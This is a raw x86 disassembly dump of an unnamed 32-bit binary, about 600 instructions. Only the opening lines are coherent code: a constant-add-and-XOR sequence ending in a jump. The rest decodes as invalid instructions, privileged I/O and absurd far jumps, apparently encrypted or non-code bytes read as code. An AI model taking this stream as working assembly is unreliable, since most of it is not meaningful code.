  4191d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4191d6:	mov    edx,DWORD PTR [ebp-0x54]
  4191d9:	add    ecx,0x64f880
  4191df:	or     ecx,edx
  4191e1:	mov    DWORD PTR [ebp-0x54],ecx
  4191e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4191e7:	mov    edx,DWORD PTR [ebp-0x50]
  4191ea:	add    ecx,0x242ebf1
  4191f0:	xor    ecx,edx
  4191f2:	mov    DWORD PTR [ebp-0x50],ecx
  4191f5:	jmp    0x41b555
  4191fa:	pop    edx
  4191fb:	cmp    al,0xf8
  4191fd:	inc    esp
  4191fe:	xchg   esi,eax
  4191ff:	test   dl,cl
  419201:	and    al,BYTE PTR [edx+0x1bf7278c]
  419207:	fwait
  419208:	mov    ch,0xbd
  41920a:	xor    esp,DWORD PTR [eax]
  41920c:	add    BYTE PTR [ebx-0x7c7ca1c2],0x1f
  419213:	xor    ecx,DWORD PTR [ecx+0x27]
  419216:	test   eax,eax
  419218:	xchg   BYTE PTR [edx-0x11],dh
  41921b:	inc    esp
  41921c:	cmp    al,0x59
  41921e:	outs   dx,BYTE PTR ds:[esi]
  41921f:	arpl   ax,di
  419221:	and    dh,BYTE PTR [ebx]
  419223:	mov    WORD PTR [esi+esi*4],ds
  419226:	int    0xdc
  419228:	dec    ebp
  419229:	cmp    eax,0x8dcb5711
  41922e:	and    al,0xc4
  419230:	ins    DWORD PTR es:[edi],dx
  419231:	mov    cx,0xdd73
  419235:	rcr    BYTE PTR [eax-0x1ea426d2],1
  41923b:	sub    DWORD PTR [edx+0x2c0fbbd7],ebx
  419241:	call   0x283c65fb
  419246:	pusha  
  419247:	jb     0x4191f6
  419249:	mov    ds:0x11b3778b,al
  41924e:	pop    ebx
  41924f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419250:	dec    edi
  419251:	adc    al,0x53
  419253:	stc    
  419254:	push   edi
  419255:	xchg   DWORD PTR [esi-0x41],edi
  419258:	(bad)  
  41925a:	daa    
  41925b:	sub    DWORD PTR [esi+0x3a],edx
  41925e:	push   0x11
  419260:	data16 xchg BYTE PTR [edx],ch
  419263:	cdq    
  419264:	and    DWORD PTR [ecx],0x8333ef54
  41926a:	cmp    DWORD PTR [ebp+edx*4-0xb],0xa586ad66
  419272:	add    esp,ebx
  419274:	pushf  
  419275:	or     dl,BYTE PTR [edx]
  419277:	cmp    bh,cl
  419279:	icebp  
  41927a:	ins    DWORD PTR es:[edi],dx
  41927b:	aaa    
  41927c:	inc    ebx
  41927d:	mov    ds:0x95dc08df,eax
  419282:	sub    dl,ah
  419284:	sbb    BYTE PTR ss:[esp+ecx*8-0x3f],0x51
  41928a:	inc    ebp
  41928b:	fs (bad) 
  41928d:	push   0xffffff83
  41928f:	pop    ss
  419290:	fcmove st,st(6)
  419292:	xchg   ecx,eax
  419293:	sub    DWORD PTR [edx],esp
  419295:	les    esp,FWORD PTR [edi]
  419297:	inc    esi
  419298:	mov    ebp,0x24b9ab5c
  41929d:	xchg   DWORD PTR [ebx+0x47],esi
  4192a0:	mov    cl,dh
  4192a2:	jno    0x419297
  4192a4:	icebp  
  4192a5:	fs aas 
  4192a7:	xor    al,0xb4
  4192a9:	(bad)  
  4192aa:	adc    BYTE PTR [ebx-0x51],cl
  4192ad:	mov    ah,0x76
  4192af:	push   ds
  4192b0:	hlt    
  4192b1:	jbe    0x41923a
  4192b3:	push   esp
  4192b4:	pop    eax
  4192b5:	clc    
  4192b6:	sbb    eax,0x2404611d
  4192bb:	jmp    0xf87502e0
  4192c0:	mov    ecx,0xe823605b
  4192c5:	mov    BYTE PTR [edx+0xc],0x5d
  4192c9:	lea    esp,[ebp-0x6a25e77b]
  4192cf:	xchg   ebx,eax
  4192d0:	sbb    ebp,DWORD PTR [edx-0x34]
  4192d3:	jle    0x419263
  4192d5:	inc    ebp
  4192d6:	and    edx,edi
  4192d8:	push   ebx
  4192d9:	hlt    
  4192da:	stos   BYTE PTR es:[edi],al
  4192db:	daa    
  4192dc:	loopne 0x419298
  4192de:	and    eax,0xdcc9d76a
  4192e3:	inc    edi
  4192e4:	cwde   
  4192e5:	xor    al,0x19
  4192e7:	and    DWORD PTR [ecx-0x69],ebx
  4192ea:	add    eax,0x80cdc70b
  4192ef:	sbb    ecx,DWORD PTR ss:[ecx]
  4192f2:	aas    
  4192f3:	popf   
  4192f4:	mov    dh,0x4e
  4192f6:	je     0x4192cb
  4192f8:	mov    edx,0x42115d7d
  4192fd:	js     0x41928f
  4192ff:	and    DWORD PTR [edx],edi
  419301:	js     0x419328
  419303:	or     edi,DWORD PTR [ebp-0x48]
  419306:	mov    eax,ds:0x628bbd36
  41930b:	push   edi
  41930c:	(bad)  
  41930d:	je     0x4192ee
  41930f:	scas   al,BYTE PTR es:[edi]
  419310:	out    0x20,al
  419312:	outs   dx,DWORD PTR ds:[esi]
  419313:	inc    eax
  419314:	jmp    0x7de9:0xc4eda6e6
  41931b:	pusha  
  41931c:	ret    0x8970
  41931f:	arpl   WORD PTR [ecx+0x2c],si
  419322:	int3   
  419323:	scas   al,BYTE PTR es:[edi]
  419324:	enter  0xada4,0x69
  419328:	fst    DWORD PTR [ebp+0x13]
  41932b:	or     al,BYTE PTR [edx]
  41932d:	dec    esp
  41932e:	je     0x41935a
  419330:	rol    BYTE PTR [edx-0x614af05a],cl
  419336:	hlt    
  419337:	outs   dx,DWORD PTR ds:[esi]
  419338:	pop    edi
  419339:	aaa    
  41933a:	xor    DWORD PTR [ebx+0x4bec2fdc],ebx
  419340:	mov    ecx,0x18c3c580
  419345:	outs   dx,DWORD PTR ds:[esi]
  419346:	aad    0x46
  419348:	sub    dh,bh
  41934a:	inc    ebx
  41934b:	or     al,0xf7
  41934d:	(bad)  [ecx]
  41934f:	xor    eax,0x23f7b707
  419354:	sbb    al,0x2c
  419356:	retf   0x1a13
  419359:	retf   0xbef1
  41935c:	(bad)  
  41935d:	cs inc esi
  41935f:	in     al,dx
  419360:	pop    ss
  419361:	test   al,0x28
  419363:	mov    WORD PTR [ebp+0x11],fs
  419366:	(bad)  
  419367:	scas   al,BYTE PTR es:[edi]
  419368:	ja     0x419377
  41936a:	xlat   BYTE PTR ds:[ebx]
  41936b:	(bad)  
  41936d:	inc    ecx
  41936e:	aam    0x66
  419370:	pop    ss
  419371:	aad    0xc2
  419373:	add    al,0x36
  419375:	inc    ecx
  419376:	inc    edx
  419377:	dec    edi
  419378:	enter  0xbab,0xa5
  41937c:	es stos BYTE PTR es:[edi],al
  41937e:	or     al,0xbe
  419380:	mov    bh,al
  419382:	in     al,0xee
  419384:	jg     0x419346
  419386:	inc    edx
  419387:	shl    DWORD PTR [edi],1
  419389:	sbb    eax,0xc7e1031d
  41938e:	aaa    
  41938f:	or     ah,BYTE PTR [eax]
  419391:	and    eax,esi
  419393:	imul   eax,DWORD PTR [esi],0xabcb012c
  419399:	pop    es
  41939a:	stos   DWORD PTR es:[edi],eax
  41939b:	jae    0x41933f
  41939d:	(bad)  
  41939e:	rol    al,0xa9
  4193a1:	adc    eax,DWORD PTR [edi+0x3e85687e]
  4193a7:	cmp    cl,0xbf
  4193aa:	push   ebx
  4193ab:	test   al,0xea
  4193ad:	push   ecx
  4193ae:	jo     0x419378
  4193b0:	ret    0x935b
  4193b3:	loope  0x419434
  4193b5:	cwde   
  4193b6:	pop    DWORD PTR [edi-0x8836add]
  4193bc:	leave  
  4193bd:	dec    ecx
  4193be:	or     edi,0x7d9a1e2e
  4193c4:	loope  0x419428
  4193c6:	pop    ds
  4193c7:	xor    eax,edi
  4193c9:	hlt    
  4193ca:	cmp    cl,bh
  4193cc:	xor    ebx,DWORD PTR [ecx-0x42]
  4193cf:	rcl    ebx,cl
  4193d1:	popf   
  4193d2:	test   BYTE PTR [eax+0x9],bh
  4193d5:	push   ds
  4193d6:	fimul  DWORD PTR [eax]
  4193d8:	das    
  4193d9:	bound  ebx,QWORD PTR [edx-0x4e]
  4193dc:	daa    
  4193dd:	rcl    DWORD PTR [edx+0x2895bce6],1
  4193e3:	cdq    
  4193e4:	lea    ecx,[ebp-0x70e586f6]
  4193ea:	mov    dl,BYTE PTR [edi-0x56]
  4193ed:	mov    dl,cl
  4193ef:	out    0x85,eax
  4193f1:	fdivr  QWORD PTR [ebp+0xe]
  4193f4:	loop   0x419464
  4193f6:	popa   
  4193f7:	mov    ebx,0x7c153768
  4193fc:	sqrtps xmm1,XMMWORD PTR [ecx+0x4514e1c]
  419403:	sqrtps xmm0,XMMWORD PTR [ecx-0x16b549b4]
  41940a:	enter  0xe998,0x95
  41940e:	lahf   
  41940f:	fst    QWORD PTR [edi]
  419411:	pop    edx
  419412:	adc    ebx,DWORD PTR ds:0xb477d9d1
  419418:	cmp    BYTE PTR [ebx+0x299741ff],dh
  41941e:	shl    DWORD PTR [ebx],0x41
  419421:	pop    esp
  419422:	into   
  419423:	sbb    al,0xe0
  419425:	mov    ah,0x2b
  419427:	dec    ebp
  419428:	out    0x6b,eax
  41942a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41942b:	cmp    al,0xb7
  41942d:	pusha  
  41942e:	mov    bl,0xb8
  419430:	sbb    esp,DWORD PTR [ebp-0x14249ce7]
  419436:	and    ecx,0x425df987
  41943c:	inc    ebp
  41943d:	jae    0x4193e9
  41943f:	lahf   
  419440:	lds    ebp,FWORD PTR [esi]
  419442:	jb     0x41941e
  419444:	pop    ebp
  419445:	lods   eax,DWORD PTR ds:[esi]
  419446:	stos   BYTE PTR es:[edi],al
  419447:	ja     0x41944e
  419449:	mov    bh,0x80
  41944b:	mov    bh,0xde
  41944d:	cmp    eax,0x609dca1e
  419452:	adc    DWORD PTR [edx],0xffffffc3
  419455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419456:	sbb    dh,0xaa
  419459:	test   eax,0xb80b3415
  41945e:	popf   
  41945f:	jae    0x419419
  419461:	lods   al,BYTE PTR ds:[esi]
  419462:	sbb    BYTE PTR [edi],ah
  419464:	adc    BYTE PTR [eax+0x52],dh
  419467:	imul   BYTE PTR [eax-0x7d919c70]
  41946d:	imul   sp,WORD PTR [esi],0x37
  419471:	sub    al,0x6d
  419473:	pop    ebp
  419474:	xor    ecx,DWORD PTR [edi]
  419476:	mov    BYTE PTR [ebx+edx*1-0x25],al
  41947a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41947b:	test   eax,0xedb0741f
  419480:	lea    esi,[edi]
  419482:	mov    ebp,0xc6156f49
  419487:	repnz scas al,BYTE PTR es:[edi]
  419489:	xchg   ecx,eax
  41948a:	les    esp,FWORD PTR [esi+0x240c7cfb]
  419490:	cmp    al,dl
  419492:	jmp    0x9e2ce0b4
  419497:	fcom   QWORD PTR [ecx-0x665e2bc9]
  41949d:	ror    BYTE PTR [edi-0x6cfbbca0],1
  4194a3:	call   0x7b62:0x27461df
  4194aa:	rcr    BYTE PTR [edi],cl
  4194ac:	sbb    DWORD PTR [ebp+0x2d7a8032],esi
  4194b2:	fist   DWORD PTR [ebp+0x310c0c97]
  4194b8:	mov    BYTE PTR [edx],bh
  4194ba:	fimul  WORD PTR [ecx-0x16b443fd]
  4194c0:	mov    ds:0x71c4fbd0,eax
  4194c5:	pop    ebx
  4194c6:	mov    bh,0xc7
  4194c8:	or     al,0x32
  4194ca:	es add esp,eax
  4194cd:	mov    bl,0x88
  4194cf:	sbb    eax,0x8c7d79fe
  4194d4:	cmp    bh,BYTE PTR [esi]
  4194d6:	das    
  4194d7:	sti    
  4194d8:	mov    ds:0xf41bf776,eax
  4194dd:	inc    ecx
  4194de:	cmp    eax,0x951f7f06
  4194e3:	mov    ecx,0x375479d8
  4194e8:	jmp    0x4194c9
  4194ea:	aaa    
  4194eb:	stc    
  4194ec:	add    eax,0x7c09b7fe
  4194f1:	and    al,0x51
  4194f3:	pop    es
  4194f4:	inc    ebp
  4194f5:	ret    
  4194f6:	cli    
  4194f7:	push   esp
  4194f8:	cli    
  4194f9:	xchg   BYTE PTR [esi],bh
  4194fb:	stos   BYTE PTR es:[edi],al
  4194fc:	fadd   QWORD PTR [edi+eax*1+0x6c0a6fc4]
  419503:	xor    DWORD PTR [ebx-0x48],ecx
  419506:	mov    edi,0xa3adfb52
  41950b:	pop    esp
  41950c:	out    0xa2,eax
  41950e:	fs pop eax
  419510:	ret    0x83fb
  419513:	bound  esp,QWORD PTR [edx+ebp*2-0x6c]
  419517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419518:	lods   eax,DWORD PTR ds:[esi]
  419519:	mov    cl,0x55
  41951b:	adc    dl,BYTE PTR [ecx-0x9b67f49]
  419521:	cwd    
  419523:	ins    DWORD PTR es:[edi],dx
  419524:	mov    al,0xc7
  419526:	and    al,0x62
  419528:	xor    ebp,DWORD PTR [ebx]
  41952a:	adc    ecx,esp
  41952c:	mov    ch,0x17
  41952e:	adc    DWORD PTR [ebx],0xe0070a91
  419534:	(bad)  
  419535:	jno    0x419546
  419537:	cmp    eax,0xe55c1c54
  41953c:	out    dx,eax
  41953d:	xchg   esp,eax
  41953e:	fcom   QWORD PTR [ebp+0x537bb851]
  419544:	das    
  419545:	mov    bl,0xfb
  419547:	loope  0x419542
  419549:	std    
  41954a:	xchg   ebx,eax
  41954b:	cmp    BYTE PTR [esi],cl
  41954d:	add    DWORD PTR [ebx-0x33],esi
  419550:	shl    BYTE PTR [edx],0x12
  419553:	les    ebp,FWORD PTR [ecx+0x2dde8e48]
  419559:	jnp    0x4194ea
  41955b:	mov    bh,0xaa
  41955d:	mov    edi,0xaa96272e
  419562:	push   0x29
  419564:	jl     0x419516
  419566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419567:	xchg   ecx,eax
  419568:	shl    edi,cl
  41956a:	ins    DWORD PTR es:[edi],dx
  41956b:	mov    ah,0xfc
  41956d:	inc    esp
  41956e:	hlt    
  41956f:	ret    
  419570:	pop    ecx
  419571:	retf   
  419572:	mov    cl,0x5b
  419574:	cmp    ch,BYTE PTR [ebp+0x1c]
  419577:	fwait
  419578:	shl    DWORD PTR [edi+0x3],cl
  41957b:	fwait
  41957c:	push   eax
  41957d:	push   ebx
  41957e:	gs es add eax,0x8cf85f18
  419585:	ja     0x419553
  419587:	(bad)  
  419589:	(bad)  [edx+eax*4-0x2c]
  41958d:	das    
  41958e:	jp     0x4195f2
  419590:	dec    ebx
  419591:	rol    BYTE PTR [ebx+0x37],1
  419594:	cpuid  
  419596:	and    al,0xb4
  419598:	adc    BYTE PTR [ebp+0x4d],dh
  41959b:	cmp    al,0xab
  41959d:	jne    0x419572
  41959f:	cmp    eax,0x65aa104d
  4195a4:	add    esi,esp
  4195a6:	mov    esi,0x9d8fe2b8
  4195ab:	or     dh,BYTE PTR [edi-0x3bb0b0db]
  4195b1:	imul   ebp,DWORD PTR [ebp+edx*4-0x7bb20987],0xffffffd6
  4195b9:	or     DWORD PTR [eax+eiz*1-0x7ad0eb1d],esi
  4195c0:	fdivr  QWORD PTR [edi]
  4195c2:	shr    ch,1
  4195c4:	adc    DWORD PTR [esi-0x35],esp
  4195c7:	adc    al,0x4c
  4195c9:	mov    edx,0x99cf103e
  4195ce:	xchg   esi,eax
  4195cf:	data16 test dh,al
  4195d2:	jnp    0x419600
  4195d4:	out    dx,eax
  4195d5:	ret    
  4195d6:	hlt    
  4195d7:	push   ebx
  4195d8:	jb     0x4195e7
  4195da:	sbb    edx,edi
  4195dc:	push   es
  4195dd:	push   ebp
  4195de:	ret    
  4195df:	je     0x4195d3
  4195e1:	lods   al,BYTE PTR ds:[esi]
  4195e2:	icebp  
  4195e3:	dec    ebx
  4195e4:	das    
  4195e5:	push   ebp
  4195e6:	jo     0x41956f
  4195e8:	push   edx
  4195e9:	ret    0x3853
  4195ec:	(bad)  
  4195ed:	fisubr DWORD PTR [ebp-0x41]
  4195f0:	xchg   dh,ch
  4195f2:	cmp    al,0x63
  4195f4:	cmp    eax,0xb54d3d26
  4195f9:	ror    ch,0x2b
  4195fc:	repnz aas 
  4195fe:	rcr    BYTE PTR [edi-0x671925f3],cl
  419604:	test   ch,0xac
  419607:	out    dx,al
  419608:	sbb    BYTE PTR [esi+0x222b6077],bh
  41960e:	push   0xb1a379f6
  419613:	sub    BYTE PTR ds:0xd879a524,cl
  419619:	add    eax,0x4ce45dca
  41961e:	mov    edx,ebp
  419620:	retf   
  419621:	pop    ebp
  419622:	popf   
  419623:	or     cl,0xf5
  419626:	call   0x1c433713
  41962b:	push   ebx
  41962c:	dec    ecx
  41962d:	imul   edx,DWORD PTR [eax],0xffffffa5
  419630:	mov    al,0xe6
  419632:	ins    DWORD PTR es:[edi],dx
  419633:	arpl   WORD PTR [esi+0x18],sp
  419636:	pop    ecx
  419637:	sub    BYTE PTR [edx+0x4b696336],bl
  41963d:	jmp    0x419656
  41963f:	out    dx,eax
  419640:	loop   0x41960a
  419642:	loopne 0x4195f0
  419644:	xchg   BYTE PTR [edx],dl
  419646:	and    al,0x10
  419648:	mov    dl,0xc0
  41964a:	jmp    0x4cc0c952
  41964f:	jmp    0x858ba1e2
  419654:	cld    
  419655:	div    esp
  419657:	aam    0xf2
  419659:	dec    esi
  41965a:	xor    DWORD PTR [ebp+edx*8-0x78db5133],ecx
  419661:	cmp    eax,0xab0a5e8e
  419666:	cmp    edi,eax
  419668:	jne    0x4196b2
  41966a:	sub    ah,ch
  41966c:	(bad)  
  41966d:	sahf   
  41966e:	jp     0x419676
  419670:	dec    ebp
  419671:	dec    esp
  419672:	sti    
  419673:	cdq    
  419674:	cmp    al,0x9d
  419676:	ins    BYTE PTR es:[edi],dx
  419677:	(bad)  
  419678:	cmp    cl,BYTE PTR [ecx-0x9]
  41967b:	xor    al,0xfb
  41967d:	xlat   BYTE PTR ds:[ebx]
  41967e:	cmp    DWORD PTR [ebx-0x6],ebx
  419681:	dec    eax
  419682:	jmp    0x1b67:0xc16d5268
  419689:	leave  
  41968a:	or     ch,BYTE PTR [eax]
  41968c:	es jge 0x41962a
  41968f:	call   0x2b3dc1d9
  419694:	ret    
  419695:	loopne 0x4196c3
  419697:	dec    edi
  419698:	dec    edx
  419699:	(bad)  
  41969a:	lods   eax,DWORD PTR ds:[esi]
  41969b:	mov    ds,esi
  41969d:	std    
  41969e:	std    
  41969f:	cwde   
  4196a0:	call   0xfb60:0xd72e2d6c
  4196a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196a8:	stos   BYTE PTR es:[edi],al
  4196a9:	pop    ebp
  4196aa:	sub    eax,0xb06c094
  4196af:	call   0xfe15e075
  4196b4:	(bad)  
  4196b5:	mov    cs,ebp
  4196b7:	arpl   WORD PTR [esi-0x69],ax
  4196ba:	ret    0x6be3
  4196bd:	push   es
  4196be:	test   bl,0x58
  4196c1:	ss mov edi,0x28e2103
  4196c7:	jb     0x41965d
  4196c9:	aaa    
  4196ca:	adc    al,0xb1
  4196cc:	cmp    esi,DWORD PTR [esp+ecx*1]
  4196cf:	pop    esp
  4196d0:	dec    eax
  4196d1:	push   edx
  4196d2:	mov    cl,0x5d
  4196d4:	cdq    
  4196d5:	add    al,0xd6
  4196d7:	frstor [ecx-0x1d]
  4196da:	sbb    DWORD PTR [ebx+edi*8],edx
  4196dd:	mov    bl,BYTE PTR [eax-0x1cd2864c]
  4196e3:	clc    
  4196e4:	mov    bl,0x28
  4196e6:	jl     0x4196b7
  4196e8:	sub    BYTE PTR [ebx],ah
  4196ea:	mov    edx,0xa36f3c53
  4196ef:	jg     0x4196f7
  4196f1:	hlt    
  4196f2:	sbb    BYTE PTR [edx-0x3293b79],ah
  4196f8:	ret    0x776c
  4196fb:	sbb    DWORD PTR [edi+edi*8-0xd],eax
  4196ff:	out    0x45,al
  419701:	inc    edi
  419702:	in     eax,dx
  419703:	adc    eax,0x2c35c68
  419708:	cli    
  419709:	dec    ecx
  41970a:	rol    edx,0xc3
  41970d:	xchg   ecx,eax
  41970e:	in     al,dx
  41970f:	retf   0xc24d
  419712:	imul   ecx,esi,0xffffffb6
  419715:	push   ss
  419716:	mov    bh,0x1f
  419718:	mov    edi,DWORD PTR [eax]
  41971a:	dec    ebp
  41971b:	mov    ch,0x6b
  41971d:	mov    DWORD PTR [edi],ebx
  41971f:	inc    edi
  419720:	xchg   BYTE PTR [eax+0x77ecbaf1],dh
  419726:	jbe    0x4197a5
  419728:	outs   dx,BYTE PTR ds:[esi]
  419729:	shl    DWORD PTR [ecx-0x47],0x5
  41972d:	div    ebx
  41972f:	jbe    0x419790
  419731:	fdiv   QWORD PTR [ecx-0x147db8cf]
  419737:	aaa    
  419738:	jo     0x4196e6
  41973a:	retf   
  41973b:	into   
  41973c:	test   eax,0x9e45c01a
  419741:	cmp    ebx,DWORD PTR [ebp-0xe8df74]
  419747:	cld    
  419748:	and    esi,DWORD PTR [ecx]
  41974a:	out    0x7e,al
  41974c:	sub    DWORD PTR [edx+esi*8],esi
  41974f:	mov    dl,0x6f
  419751:	in     eax,dx
  419752:	add    eax,0x812c7857
  419757:	push   0x7d80d857
  41975c:	mov    ebp,0xb862fc58
  419761:	outs   dx,BYTE PTR ds:[esi]
  419762:	or     eax,0x9dd33c59
  419767:	(bad)  
  419769:	mov    BYTE PTR [ebx-0x771d6e58],bl
  41976f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419770:	fs mov ebp,ebp
  419773:	pusha  
  419774:	jne    0x4197f1
  419776:	xor    esp,DWORD PTR [esi-0x58]
  419779:	cmp    BYTE PTR [ebx],ah
  41977b:	test   ecx,esp
  41977d:	xchg   ecx,eax
  41977e:	jae    0x4197d3
  419780:	adc    DWORD PTR [edx+0x31],0xffffff82
  419784:	mov    ds:0xb80c6508,eax
  419789:	cld    
  41978a:	cwde   
  41978b:	ja     0x4197f8
  41978d:	mov    dh,0x3
  41978f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419790:	adc    DWORD PTR [eax],esp
  419792:	sahf   
  419793:	push   cs
  419794:	cmp    BYTE PTR [ebx+0x5e],ah
  419797:	push   0xd5f0e4ea
  41979c:	stc    
  41979d:	(bad)  
  41979e:	cli    
  41979f:	stos   DWORD PTR es:[edi],eax
  4197a0:	mov    fs,ebp
  4197a2:	enter  0xd0ef,0x1e
  4197a6:	push   cs
  4197a7:	xor    cl,BYTE PTR [esp+eax*2+0x6e]
  4197ab:	adc    al,dh
  4197ad:	cmp    DWORD PTR [edx+0x51824ac],edi
  4197b3:	fisttp QWORD PTR [eax+0x2]
  4197b6:	out    dx,al
  4197b7:	retf   0xfc38
  4197ba:	fdivr  QWORD PTR [ebx+0x65]
  4197bd:	inc    eax
  4197be:	call   0xe0115b27
  4197c3:	push   ebp
  4197c4:	add    al,0x9e
  4197c6:	mov    esi,esi
  4197c8:	add    BYTE PTR [ebx-0x6],dl
  4197cb:	test   ebp,ecx
  4197cd:	mov    esi,0x770f49c
  4197d2:	es or  edx,0xa1fae639
  4197d9:	adc    eax,0xfa45f28c
  4197de:	sbb    ch,ch
  4197e0:	inc    esp
  4197e1:	mov    DWORD PTR [edx+0x7b],esi
  4197e4:	mov    eax,0x1b64dfb8
  4197e9:	inc    esi
  4197ea:	ret    0x15ab
  4197ed:	mov    dh,0x83
  4197ef:	adc    edx,DWORD PTR [ebp+esi*4-0x1c]
  4197f3:	jl     0x4197d7
  4197f5:	addr16 aas 
  4197f7:	xor    ah,BYTE PTR ds:0x808692de
  4197fd:	pcmpgtb mm6,QWORD PTR [edx+0x3e628faf]
  419804:	adc    edi,DWORD PTR [ebx+0x32]
  419807:	pop    edx
  419808:	test   eax,0x843d7987
  41980d:	inc    ebp
  41980e:	inc    edx
  41980f:	(bad)  
  419810:	jno    0x41984c
  419812:	in     eax,dx
  419813:	rol    DWORD PTR [ebx-0x2e],1
  419816:	mov    esi,0xe7d98cf
  41981b:	xchg   ebp,eax
  41981c:	sbb    al,BYTE PTR [esi-0x1f]
  41981f:	mov    eax,0xd45bab75
  419824:	and    dh,BYTE PTR [ebp+0x4aeb1541]
  41982a:	mov    eax,0x2ed80ce7
  41982f:	cmp    BYTE PTR [ecx-0x4686f329],cl
  419835:	mov    cl,0x6b
  419837:	lea    esp,ds:0x8534d631
  41983d:	mov    edx,0xaee98e6
  419842:	inc    esi
  419843:	inc    ebx
  419844:	je     0x419824
  419846:	mov    bl,0x2e
  419848:	jmp    0x1677:0x61646e53
  41984f:	mov    ds:0x4a648ca,al
  419854:	xor    BYTE PTR [edi-0x3c],bl
  419857:	xor    BYTE PTR [ecx+0x3cefb54e],0x23
  41985e:	push   edi
  41985f:	retf   
  419860:	ss in  eax,dx
  419862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419863:	mov    ah,0xa4
  419865:	lahf   
  419866:	jb     0x419811
  419868:	and    eax,0xccdf8690
  41986d:	mov    eax,0xfc665e2a
  419872:	dec    ebp
  419873:	int3   
  419874:	jo     0x419807
  419876:	(bad)  
  419877:	sub    BYTE PTR [eax-0x7],bh
  41987a:	xchg   dl,ah
  41987c:	mov    edx,0x95302684
  419881:	dec    edx
  419882:	outs   dx,DWORD PTR ds:[esi]
  419883:	out    0x90,al
  419885:	mov    al,0xbd
  419887:	mov    edx,0xbe8836fe
  41988c:	sub    BYTE PTR [ecx],dh
  41988e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41988f:	es xchg esi,eax
  419891:	(bad)  
  419892:	xchg   ebp,eax
  419893:	lods   eax,DWORD PTR ds:[esi]
  419894:	or     DWORD PTR [ebx+0x717f4812],edi
  41989a:	add    al,0x94
  41989c:	add    esi,eax
  41989e:	pop    edi
  41989f:	mov    cl,0xdc
  4198a1:	ja     0x4198c7
  4198a3:	pop    eax
  4198a4:	fucom  st(1)
  4198a6:	call   0x652a5991
  4198ab:	mov    ebx,0x2f16a78f
  4198b0:	out    0xc1,eax
  4198b2:	inc    ecx
  4198b3:	stc    
  4198b4:	sub    BYTE PTR [ebx-0x5b],dl
  4198b7:	je     0x4198cc
  4198b9:	jmp    0x4f8c0af8
  4198be:	push   ebp
  4198bf:	add    dl,BYTE PTR [ebx]
  4198c1:	shl    BYTE PTR [ebp+0x18],1
  4198c4:	cld    
  4198c5:	sbb    edx,DWORD PTR [edx+0x2de51651]
  4198cb:	xchg   edi,esi
  4198cd:	lock inc edx
  4198cf:	sub    BYTE PTR [edx+0x67],dl
  4198d2:	jmp    DWORD PTR [ebp-0x38]
  4198d5:	cmc    
  4198d6:	push   edx
  4198d7:	cmp    ebp,DWORD PTR [eax+edi*4]
  4198da:	lahf   
  4198db:	addr16 inc esi
  4198dd:	or     al,0xb1
  4198df:	pop    ds
  4198e0:	ins    DWORD PTR es:[edi],dx
  4198e1:	aam    0xbe
  4198e3:	in     eax,dx
  4198e4:	push   edi
  4198e5:	xchg   esi,eax
  4198e6:	mov    ?,WORD PTR [eax+0x71de9d9b]
  4198ec:	sub    DWORD PTR [ebx+0x48],ecx
  4198ef:	in     al,0xf
  4198f1:	xchg   DWORD PTR [eax-0x6afc5cde],edx
  4198f7:	push   0xffffffc1
  4198f9:	or     esi,DWORD PTR [esi+0xc]
  4198fc:	rcr    DWORD PTR [ebp+0x7bde3e64],1
  419902:	test   bh,bl
  419904:	add    edi,eax
  419906:	ja     0x4198eb
  419908:	aas    
  419909:	dec    esp
  41990a:	xchg   ebp,eax
  41990b:	je     0x4198c6
  41990d:	std    
  41990e:	shr    BYTE PTR [edx-0x73],1
  419911:	(bad)  
  419912:	and    al,BYTE PTR [esi-0x62]
  419915:	or     al,0x50
  419917:	inc    edi
  419918:	(bad)  
  419919:	push   ebx
  41991a:	jge    0x4198a6
  41991c:	mov    DWORD PTR [ecx+ebp*1],esi
  41991f:	adc    bl,BYTE PTR [eax+eax*8]
  419922:	jl     0x419953
  419924:	lahf   
  419925:	and    al,0xce
  419927:	dec    al
  419929:	out    dx,eax
  41992a:	push   0x7870da33
  41992f:	cmp    BYTE PTR [esi+0x12],bh
  419932:	sub    BYTE PTR [eax],bh
  419934:	xchg   esi,eax
  419935:	rcl    dh,0x5f
  419938:	leave  
  419939:	popf   
  41993a:	push   edx
  41993b:	or     ebx,DWORD PTR [esi-0x47]
  41993e:	mov    ah,0xbe
  419940:	int    0x45
  419942:	and    DWORD PTR [edx],0xffffffdb
  419945:	cs fcomp DWORD PTR es:[esp+ebp*4-0x4bc6a2bf]
  41994e:	xchg   esp,eax
  41994f:	pop    ebx
  419951:	jb     0x41997a
  419953:	sbb    eax,0xc592fcf1
  419958:	js     0x41991b
  41995a:	mov    BYTE PTR [esi+0x68912ede],al
  419960:	inc    esi
  419961:	int    0x3f
  419963:	sbb    ebx,esp
  419965:	sti    
  419966:	fisttp QWORD PTR [edi]
  419968:	popf   
  419969:	ins    DWORD PTR es:[edi],dx
  41996a:	mov    esp,0x9eb34656
  41996f:	add    dl,BYTE PTR [ebp+0x37]
  419972:	sbb    DWORD PTR [edi*1+0x20e5a887],0x4e2cb448
  41997d:	out    dx,al
  41997e:	in     al,0x33
  419980:	xchg   edi,eax
  419981:	jbe    0x41998e
  419983:	adc    eax,DWORD PTR [edx-0x16]
  419986:	clc    
  419987:	adc    BYTE PTR [esi+ebx*1-0x1b0847e0],0xb6
  41998f:	lods   eax,DWORD PTR ds:[esi]
  419990:	daa    
  419991:	push   esp
  419992:	cs jmp 0x41994e
  419995:	test   BYTE PTR [esi],ch
  419997:	popa   
  419998:	push   edi
  419999:	push   eax
  41999a:	ins    BYTE PTR es:[edi],dx
  41999b:	lock pop ebx
  41999d:	das    
  41999e:	lea    esp,[edi+0x4a]
  4199a1:	out    0x8e,al
  4199a3:	cmp    ch,BYTE PTR ds:0xe041ae94
  4199a9:	jl     0x419a20
